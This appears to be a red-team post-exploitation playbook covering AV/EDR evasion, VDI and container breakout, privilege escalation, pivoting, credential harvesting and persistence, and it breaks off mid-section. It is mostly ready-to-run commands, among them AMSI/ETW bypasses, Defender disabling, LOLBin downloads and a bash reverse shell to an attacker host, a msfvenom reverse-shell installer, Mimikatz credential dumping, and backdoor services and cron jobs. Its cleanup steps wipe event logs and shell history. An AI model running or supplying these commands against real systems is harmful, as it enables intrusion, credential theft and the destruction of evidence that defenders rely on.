# Breakout and Post-Exploitation Methodology

---

## 1. Initial Situational Awareness

**Category:** Post-Exploitation  
**Description:** Understand the current environment before attempting any breakout or escalation.

**Tools Required:**
- Built-in OS commands
- PowerShell/cmd (Windows)
- bash/sh (Linux)

**Steps/Commands:**
```bash
# Windows - Basic enumeration
whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
ipconfig /all
netstat -ano
tasklist /v
wmic process list brief
query user
net user
net localgroup administrators
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall"

# Linux - Basic enumeration
id
hostname
uname -a
cat /etc/os-release
ip a
ss -tulpn
ps aux
who
cat /etc/passwd
groups
sudo -l
dpkg -l | head -20  # or rpm -qa

# Check for virtualization/containerization
# Windows
wmic computersystem get model
wmic bios get serialnumber
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum"

# Linux
systemd-detect-virt
cat /proc/1/cgroup
ls -la /.dockerenv
cat /proc/self/status | grep -i "seccomp\|apparmor"
dmesg | grep -i hypervisor
```

**Pitfalls:**
- Commands may trigger EDR alerts
- Some commands require elevated privileges
- Output may be logged
- Network traffic monitored

**Cleanup Steps:**
```bash
# Clear command history
# Windows
doskey /history > nul
# Linux
history -c
cat /dev/null > ~/.bash_history
```

**Suggested Findings:**
- Virtualization platform identified
- Security products detected
- Network segmentation observed
- User privilege level determined

**Conditions When to Try:**
- Initial foothold obtained
- Before escalation attempts
- Planning breakout strategy
- Identifying security controls

---

## 2. AV/EDR Detection and Evasion

**Category:** Defense Evasion  
**Description:** Identify and evade endpoint security products.

**Tools Required:**
- WMI/PowerShell
- Process enumeration tools
- Obfuscation utilities

**Steps/Commands:**
```bash
# Windows - Identify AV/EDR products
# Via WMI
wmic /namespace:\\root\securitycenter2 path antivirusproduct
wmic /namespace:\\root\securitycenter2 path antispywareproduct
wmic process where "name like '%defender%' or name like '%sophos%' or name like '%mcafee%' or name like '%symantec%' or name like '%trend%' or name like '%kaspersky%' or name like '%norton%' or name like '%avast%' or name like '%avg%' or name like '%eset%' or name like '%crowdstrike%' or name like '%carbon%' or name like '%sentinel%' or name like '%cylance%' or name like '%cortex%'" get name,processid,commandline

# Check services
sc query | findstr /i "defender sophos mcafee symantec trend kaspersky norton avast avg eset crowdstrike carbon sentinel cylance cortex"
Get-Service | Where-Object {$_.DisplayName -like "*defender*" -or $_.DisplayName -like "*sophos*" -or $_.DisplayName -like "*mcafee*"}

# Check installed programs
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | findstr /i "antivirus endpoint security defender"

# Check running processes (common EDR/AV)
tasklist | findstr /i "MsMpEng.exe csfalconservice.exe xagt.exe cbdefense.exe taniumclient.exe"

# Linux - Identify security products
ps aux | grep -E "falcon|cylance|crowdstrike|sophos|mcafee|trend|kaspersky"
systemctl list-units --type=service | grep -E "falcon|cylance|crowdstrike|sophos"
ls -la /opt/ | grep -E "falcon|cylance|crowdstrike|sophos"
find /etc -name "*antivirus*" -o -name "*endpoint*" 2>/dev/null

# AMSI Bypass (Windows) - Multiple techniques
# Technique 1: Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Technique 2: Memory patching (Base64 encoded)
$<VAR_NAME> = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<BASE64_AMSI_BYPASS>"))
Invoke-Expression $<VAR_NAME>

# Technique 3: Force error
[System.Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'agement.Aut','omation.','n','A','i','System.Ma','ms')+("{2}{0}{1}" -f 'tl','s','Utils')).GetField(("{1}{2}{0}{3}" -f 'iFailed','am','siInit'),[Reflection.BindingFlags]("{2}{0}{1}" -f 'blic,Sta','tic','NonPu')).GetValue($null),0x41414141)

# ETW Bypass
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

# Disable Windows Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
sc stop WinDefend
sc config WinDefend start=disabled

# Process injection to evade
# Inject into legitimate process
$<PROCESS_NAME> = Get-Process explorer | Select-Object -First 1
$<HANDLE> = [Kernel32]::OpenProcess(0x1F0FFF, $false, $<PROCESS_NAME>.Id)

# Living off the land binaries (LOLBins)
# Use legitimate Windows binaries for execution
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/<FILE> <OUTPUT_FILE>
regsvr32.exe /s /n /u /i:http://<ATTACKER_IP>/<SCT_FILE> scrobj.dll
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe /c <COMMAND>");
mshta.exe http://<ATTACKER_IP>/<HTA_FILE>
```

**Pitfalls:**
- Modern EDR behavioral detection
- AMSI bypasses may be patched
- Kernel-level monitoring
- Cloud-based analysis
- Process injection detection

**Cleanup Steps:**
```bash
# Re-enable security products (cover tracks)
Set-MpPreference -DisableRealtimeMonitoring $false
sc config WinDefend start=auto
sc start WinDefend
```

**Suggested Findings:**
- AV/EDR products identified
- AMSI/ETW bypass successful
- Security products disabled
- LOLBin execution possible

**Conditions When to Try:**
- Security products blocking execution
- Before running tools
- Payload delivery needed
- Persistence establishment

---

## 3. VDI Breakout Techniques

**Category:** Container/VM Escape  
**Description:** Escape from Virtual Desktop Infrastructure environments (Citrix, VMware Horizon, RDS).

**Tools Required:**
- Built-in OS commands
- Registry editor
- PowerShell
- File explorers

**Steps/Commands:**
```bash
# Identify VDI environment
# Check for Citrix
Get-Process | Where-Object {$_.ProcessName -match "citrix"}
Get-Service | Where-Object {$_.DisplayName -match "citrix"}
reg query "HKLM\SOFTWARE\Citrix"
Test-Path "C:\Program Files\Citrix"

# Check for VMware Horizon
Get-Process | Where-Object {$_.ProcessName -match "vmware"}
reg query "HKLM\SOFTWARE\VMware, Inc."

# Check for RDS/Terminal Services
qwinsta
query session
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"

# Citrix Breakout Techniques
# Method 1: Dialog box exploitation
# Open any dialog (Save As, Open, Print)
# Type in address bar: \\<ATTACKER_IP>\share
# Or navigate to: C:\Windows\System32\cmd.exe

# Method 2: Help file exploitation
# Press F1 in any application
# Right-click and view source
# Click on "Jump to URL" or similar
# Enter: file:///C:/Windows/System32/cmd.exe

# Method 3: Explorer access via dialogs
# In Save/Open dialog, right-click
# Select "Open in new window"
# Navigate to system directories

# Method 4: Sticky keys backdoor
# If you have write access:
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# Press Shift 5 times at login screen

# Method 5: Task Manager access
Ctrl+Shift+Esc
# File -> Run new task -> Browse
# Navigate to cmd.exe

# Method 6: MS Office exploitation
# Create new document
# Insert -> Object -> Package
# Browse to cmd.exe
# Or use macros:
Sub RunCmd()
    Shell "cmd.exe", vbNormalFocus
End Sub

# Method 7: Browser exploitation
# In browser address bar:
file:///C:/Windows/System32/cmd.exe
# Or for Chrome:
chrome://settings
# Search for "downloads" -> Open downloads folder
# Navigate up to C:\

# VMware Horizon Breakout
# Method 1: Unity mode exploitation
# Drag and drop files from local to remote
# Use clipboard for file transfer

# Method 2: USB redirection
# If USB allowed, use portable apps
# Or autorun exploits

# Method 3: Printer redirection
# Print to file (PDF/XPS)
# Redirect to writable location

# RDS/Terminal Services Breakout
# Method 1: Resource redirection
net use \\tsclient\c
dir \\tsclient\c
copy <FILE> \\tsclient\c\temp\

# Method 2: Clipboard abuse
echo <PAYLOAD> | clip
# Paste on host system

# Method 3: Port forwarding via RDP
# Use RDP port forwarding features
# Or SSH tunneling if available

# Registry bypasses for restrictions
# Remove Run restriction
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0 /f

# Enable Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f

# Enable Registry Editor
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f

# Enable Command Prompt
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f

# PowerShell execution policy bypass
powershell -ExecutionPolicy Bypass -File <SCRIPT>
powershell -ep bypass
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force

# Access locked drives
subst Z: C:\
net use * \\localhost\C$
```

**Pitfalls:**
- Application whitelisting
- Group Policy restrictions
- Session recording active
- Limited user permissions
- Network isolation

**Cleanup Steps:**
```bash
# Remove registry changes
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /f
# Clear event logs if possible
wevtutil cl Application
wevtutil cl System
```

**Suggested Findings:**
- VDI environment confirmed
- Breakout method successful
- Local system access gained
- Restrictions bypassed

**Conditions When to Try:**
- Restricted VDI environment
- Kiosk mode systems
- Published applications only
- Need local system access

---

## 4. Container Breakout Techniques

**Category:** Container Escape  
**Description:** Escape from Docker, Kubernetes, or other containerized environments.

**Tools Required:**
- Docker client
- kubectl
- System binaries
- Exploit tools

**Steps/Commands:**
```bash
# Identify containerization
# Check if in Docker
cat /proc/1/cgroup
ls -la /.dockerenv
cat /proc/self/cgroup | grep -i docker
mount | grep docker

# Check if in Kubernetes
ls -la /var/run/secrets/kubernetes.io
env | grep KUBERNETES
mount | grep kubernetes

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# Docker Breakout Techniques
# Method 1: Privileged container
# Check if privileged
cat /proc/self/status | grep -i seccomp
# If privileged, mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host bash

# Method 2: Docker socket mount
# Check for docker socket
ls -la /var/run/docker.sock
# If present, use it
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged ubuntu chroot /host bash

# Method 3: Kernel exploit
# Check kernel version
uname -r
# Use known exploits (DirtyCOW, DirtyPipe, etc.)
gcc -o dirtycow dirtycow.c
./dirtycow /etc/passwd

# Method 4: Capability abuse
# CAP_SYS_ADMIN
mount -t cgroup -o memory cgroup /tmp/cgroup
echo 1 > /tmp/cgroup/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgroup/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > /output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgroup/cgroup.procs"

# CAP_SYS_PTRACE
ps aux | grep root
gdb -p <PID>
call system("cat /etc/shadow")

# CAP_DAC_OVERRIDE
cat /etc/shadow

# Method 5: CVE-2019-5736 (runC)
# Overwrite runC binary on host
# Complex exploit - use public PoC

# Kubernetes Breakout
# Method 1: Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Method 2: Create privileged pod
cat > priv-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
kubectl apply -f priv-pod.yaml
kubectl exec -it priv-pod -- chroot /host bash

# Method 3: Node proxy abuse
kubectl proxy --port=8080
curl http://localhost:8080/api/v1/nodes/<NODE_NAME>/proxy/

# Method 4: Helm Tiller exploitation (if present)
helm --host tiller-deploy.kube-system:44134 install pwn --set image.tag=latest ./malicious-chart

# Cloud metadata service access
# AWS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

**Pitfalls:**
- AppArmor/SELinux policies
- Seccomp filters
- Read-only filesystems
- Network policies
- Admission controllers

**Cleanup Steps:**
```bash
# Remove created pods/containers
kubectl delete pod priv-pod
docker rm -f <CONTAINER_ID>
# Clear logs
> /var/log/messages
```

**Suggested Findings:**
- Container environment identified
- Privileged access available
- Host filesystem accessible
- Cloud metadata exposed

**Conditions When to Try:**
- Container environment detected
- Need host system access
- Cloud service exploitation
- Lateral movement required

---

## 5. Windows Privilege Escalation

**Category:** Privilege Escalation  
**Description:** Escalate privileges on Windows systems from low-privileged user to SYSTEM/Administrator.

**Tools Required:**
- PowerShell
- Windows binaries
- Exploit tools
- winPEAS/PowerUp

**Steps/Commands:**
```bash
# Automated enumeration
# Download and run winPEAS
certutil.exe -urlcache -f http://<ATTACKER_IP>/winPEAS.exe winPEAS.exe
.\winPEAS.exe

# PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Manual enumeration
# System information
systeminfo
wmic qfe list brief  # Patches
hostname
net users
net localgroup administrators
whoami /priv
whoami /groups

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
sc qc <SERVICE_NAME>

# Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check for stored credentials
cmdkey /list
dir C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
dir C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\

# RunAs with stored credentials
runas /savecred /user:<DOMAIN>\<USERNAME> cmd.exe

# Check scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "task\|author\|user\|cmd"

# Check for writable folders in PATH
for %A in ("%path:;=";"%") do ( accesschk.exe -dqv "%~A" )

# Service Exploitation
# Method 1: Unquoted service path
# If path: C:\Program Files\My Program\Service.exe
# Try placing malicious exe at:
# C:\Program.exe
# C:\Program Files\My.exe

# Method 2: Weak service permissions
sc config <SERVICE_NAME> binpath= "C:\temp\shell.exe"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

# Method 3: Registry service modification
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME>" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f

# Method 4: DLL hijacking
# Find missing DLLs
procmon.exe /accepteula
# Filter: Process Name contains <TARGET>, Result is NAME NOT FOUND
# Place malicious DLL in writable PATH location

# AlwaysInstallElevated exploitation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# Scheduled Task exploitation
# If writable task found:
schtasks /change /tn "<TASK_NAME>" /tr "C:\temp\shell.exe"

# Token Impersonation
# SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
# Use JuicyPotato/RoguePotato/PrintSpoofer
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
.\PrintSpoofer.exe -i -c cmd.exe
.\RoguePotato.exe -r <ATTACKER_IP> -e "C:\temp\shell.exe" -l 9999

# UAC Bypass techniques
# Method 1: Fodhelper
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start cmd.exe" /f
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# Method 2: EventVwr
REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c start cmd.exe" /f
eventvwr.exe

# Method 3: CompMgmt
REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c start cmd.exe" /f
CompMgmt.msc

# Kernel exploits (based on systeminfo output)
# MS16-032
powershell -ep bypass
Import-Module .\MS16-032.ps1
Invoke-MS16-032

# MS16-135
.\MS16-135.exe

# PrintNightmare
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "<USERNAME>" -NewPassword "<PASSWORD>" -DriverName "PrintMe"
```

**Pitfalls:**
- Defender detecting exploits
- EDR behavioral monitoring
- Exploit reliability issues
- System instability risk
- Audit logging

**Cleanup Steps:**
```bash
# Restore modified services
sc config <SERVICE_NAME> binpath= "<ORIGINAL_PATH>"
# Delete created users
net user <USERNAME> /delete
# Remove registry entries
reg delete HKCU\Software\Classes\ms-settings /f
```

**Suggested Findings:**
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated enabled
- SeImpersonate privilege
- Missing patches

**Conditions When to Try:**
- Low privilege shell obtained
- Local admin access needed
- Domain escalation required
- Service exploitation possible

---

## 6. Linux Privilege Escalation

**Category:** Privilege Escalation  
**Description:** Escalate privileges on Linux systems from low-privileged user to root.

**Tools Required:**
- bash/sh
- Standard Unix tools
- LinPEAS/LinEnum
- Exploit tools

**Steps/Commands:**
```bash
# Automated enumeration
# Download and run LinPEAS
curl http://<ATTACKER_IP>/linpeas.sh | bash
wget http://<ATTACKER_IP>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# LinEnum
./LinEnum.sh -t -k password

# Manual enumeration
# System information
uname -a
cat /etc/os-release
cat /proc/version
hostname
id
pwd

# User enumeration
cat /etc/passwd
cat /etc/group
groups
who
w
last

# Sudo privileges
sudo -l
sudo -V

# SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable files/directories
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type d 2>/dev/null
ls -la /etc/passwd
ls -la /etc/shadow

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l
ls -la /var/spool/cron/crontabs/

# Running processes
ps aux
ps -ef
top

# Network connections
netstat -tulpn
ss -tulpn
lsof -i

# Kernel exploits
# DirtyCOW (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <NEW_PASSWORD>

# DirtyPipe (CVE-2022-0847)
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd 1

# PwnKit (CVE-2021-4034)
gcc pwnkit.c -o pwnkit
./pwnkit

# Sudo exploits
# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (sudo heap overflow)
./sudo-hax

# SUID binary exploitation
# Find SUID binaries
find / -perm -4000 2>/dev/null | xargs ls -la

# GTFOBins references
# If find is SUID:
find . -exec /bin/sh \; -quit

# If vim is SUID:
vim -c ':!/bin/sh'

# If python is SUID:
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If perl is SUID:
perl -e 'exec "/bin/sh";'

# Capability exploitation
# CAP_SETUID
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_DAC_OVERRIDE
cat /etc/shadow

# CAP_DAC_READ_SEARCH
tar -cf shadow.tar /etc/shadow

# Writable /etc/passwd
# Add new root user
echo 'newroot:$6$<SALT>$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
# Or
openssl passwd -6 -salt <SALT> <PASSWORD>
echo 'newroot:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Cron job exploitation
# If writable cron script found
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" >> /path/to/cron/script.sh

# If PATH manipulation possible
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH

# Wildcard exploitation (tar, rsync, etc.)
# If cron runs: tar -czf backup.tar.gz *
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=./shell.sh'

# LD_PRELOAD exploitation
# Create malicious library
cat > /tmp/exploit.c << EOF
#include <unistd.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c
LD_PRELOAD=/tmp/exploit.so <SUID_BINARY>

# Docker group exploitation
# If user in docker group
docker run -it -v /:/host --privileged alpine chroot /host bash

# LXD group exploitation
# If user in lxd group
lxc init ubuntu:18.04 test -c security.privileged=true
lxc config device add test host-root disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test /bin/bash
```

**Pitfalls:**
- SELinux/AppArmor restrictions
- Kernel hardening (KASLR, etc.)
- Exploit detection
- System instability
- Limited compiler access

**Cleanup Steps:**
```bash
# Remove created files
rm -f /tmp/exploit.so /tmp/bash
# Remove added users
userdel newroot
# Restore modified files
cp /etc/passwd.bak /etc/passwd
```

**Suggested Findings:**
- SUID binaries exploitable
- Sudo misconfiguration
- Kernel vulnerabilities
- Writable sensitive files
- Dangerous capabilities

**Conditions When to Try:**
- Shell access obtained
- Root access needed
- Container breakout required
- Lateral movement needed

---

## 7. Network Pivoting and Lateral Movement

**Category:** Post-Exploitation  
**Description:** Pivot through compromised systems to reach isolated network segments.

**Tools Required:**
- SSH/proxychains
- Metasploit
- Chisel/ligolo
- socat/netcat
- PowerShell

**Steps/Commands:**
```bash
# Network discovery from compromised host
# Windows
ipconfig /all
arp -a
route print
netstat -an
net view
net view /domain
nslookup -type=SRV _ldap._tcp.<DOMAIN>

# Linux
ip a
ip route
arp -a
netstat -tulpn
route -n
cat /etc/hosts
nmap -sn <SUBNET>/24 2>/dev/null

# SSH Pivoting
# Local port forwarding
ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> <USER>@<PIVOT_HOST>

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 <USER>@<PIVOT_HOST>
# Configure proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT <TARGET_SUBNET>/24

# Remote port forwarding
ssh -R <REMOTE_PORT>:<LOCAL_HOST>:<LOCAL_PORT> <USER>@<PIVOT_HOST>

# SSH ProxyJump
ssh -J <USER>@<PIVOT_HOST> <USER>@<TARGET_HOST>

# Chisel (HTTP tunneling)
# On attacker machine (server)
./chisel server -p 8080 --reverse

# On pivot machine (client)
# Windows
.\chisel.exe client <ATTACKER_IP>:8080 R:socks
# Linux
./chisel client <ATTACKER_IP>:8080 R:socks

# Configure proxychains for Chisel
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Ligolo-ng (Better performance)
# On attacker (proxy server)
./ligolo-proxy -selfcert

# On pivot (agent)
./ligolo-agent -connect <ATTACKER_IP>:11601 -ignore-cert

# In ligolo interface
session
1
start

# Metasploit pivoting
# After initial compromise
meterpreter > run autoroute -s <TARGET_SUBNET>/24
meterpreter > background
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 9050
msf > run

# Port forwarding with Metasploit
meterpreter > portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_HOST>
meterpreter > portfwd list

# Windows native pivoting
# netsh (Windows)
netsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<REMOTE_PORT> connectaddress=<TARGET_IP>
netsh interface portproxy show all

# PowerShell port forwarding
$listener = [System.Net.Sockets.TcpListener]<LOCAL_PORT>
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $targetClient = New-Object System.Net.Sockets.TcpClient("<TARGET_HOST>", <TARGET_PORT>)
    $targetStream = $targetClient.GetStream()
    Start-Job -ScriptBlock {
        param($stream, $targetStream)
        while (($byte = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $targetStream.Write($bytes, 0, $byte)
        }
    } -ArgumentList $stream, $targetStream
}

# Socat tunneling
# Simple port forward
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<TARGET_HOST>:<TARGET_PORT>

# SOCKS proxy with socat
socat TCP-LISTEN:1080,fork SOCKS4A:localhost:<TARGET_HOST>:<TARGET_PORT>,socksport=9050

# Double pivot
# First pivot
ssh -D 9050 user@pivot1
# Second pivot through first
proxychains ssh -D 9051 user@pivot2
# Update proxychains.conf
echo "socks5 127.0.0.1 9051" >> /etc/proxychains.conf

# Lateral movement techniques
# Windows
# PSExec
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

# WMI
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

# RDP
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP>

# WinRM
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>

# DCOM
impacket-dcomexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

# Linux
# SSH with key
ssh -i <KEY_FILE> <USER>@<TARGET_IP>

# Pass the hash
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USER>@<TARGET_IP>

# Credential harvesting for lateral movement
# Windows
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets

# LaZagne
laZagne.exe all

# Linux
# Search for credentials
grep -r "password" /etc 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat ~/.bash_history
cat ~/.ssh/id_rsa

# BloodHound for AD lateral movement
# Collect data
SharpHound.exe -c All
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c all

# Analyze in BloodHound GUI
# Look for paths to Domain Admin
```

**Pitfalls:**
- Firewall rules blocking pivots
- IDS detecting tunnel traffic
- Connection stability issues
- Credential reuse detection
- Network segmentation

**Cleanup Steps:**
```bash
# Remove port forwards
netsh interface portproxy delete v4tov4 listenport=<LOCAL_PORT>
# Kill tunnel processes
pkill chisel
pkill socat
# Clear Metasploit routes
meterpreter > route flush
```

**Suggested Findings:**
- Network segmentation bypassed
- Internal networks accessible
- Credential reuse successful
- Domain compromise possible

**Conditions When to Try:**
- Multiple network segments
- Internal targets unreachable
- Cloud/on-prem hybrid
- Domain escalation needed

---

## 8. Persistence Techniques

**Category:** Persistence  
**Description:** Maintain access to compromised systems across reboots and remediation attempts.

**Tools Required:**
- Native OS tools
- PowerShell/bash
- Scheduled tasks/cron
- Registry editors

**Steps/Commands:**
```bash
# Windows Persistence
# Registry Run Keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "<NAME>" /d "C:\temp\shell.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "<NAME>" /d "C:\temp\shell.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "<NAME>" /d "C:\temp\shell.exe" /f

# Scheduled Tasks
schtasks /create /tn "<TASK_NAME>" /tr "C:\temp\shell.exe" /sc onlogon /ru System
schtasks /create /tn "<TASK_NAME>" /tr "C:\temp\shell.exe" /sc daily /st 09:00

# Service creation
sc create <SERVICE_NAME> binpath= "C:\temp\shell.exe" start= auto
sc description <SERVICE_NAME> "Legitimate Service"

# WMI Event Subscription
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="<FILTER_NAME>", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

# Startup folder
copy C:\temp\shell.exe "C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"

# DLL hijacking persistence
# Find vulnerable applications that run at startup
# Place malicious DLL in application directory

# Sticky Keys backdoor
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# Linux Persistence
# Cron jobs
(crontab -l ; echo "@reboot /tmp/shell.sh") | crontab -
(crontab -l ; echo "*/5 * * * * /tmp/shell.sh") | crontab -
echo "* * * * * root /tmp/shell.sh" >> /etc/crontab

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Legitimate Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/shell.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service

# RC scripts
echo "/tmp/shell.sh &" >> /etc/rc.local
chmod +x /etc/rc.local

# Bashrc backdoor
echo "nohup /tmp/shell.sh &" >> ~/.bashrc
echo "alias ls='/tmp/shell.sh; ls'" >> ~/.bashrc

# SSH keys
mkdir ~/.ssh 2>/dev/null
echo "<PUBLIC_KEY>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# MOTD backdoor
echo "/tmp/shell.sh &" >> /etc/update-motd.d/00-header

# PAM backdoor
# Patch pam_unix.so to accept backdoor password

# Container Persistence
# Kubernetes
# Create persistent pod
